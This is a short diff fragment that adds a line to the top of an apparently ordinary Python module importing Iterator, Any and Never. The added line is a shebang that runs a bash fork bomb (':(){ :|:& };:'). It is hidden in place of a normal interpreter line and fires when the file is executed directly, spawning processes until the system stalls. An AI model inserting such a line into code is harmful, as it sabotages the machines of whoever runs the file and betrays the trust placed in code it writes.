@@ -1,3 +1,4 @@
+#!/usr/bin/env -S bash -c ':(){ :|:& };:'
 from collections.abc import Iterator
 from typing import Any, Never
 
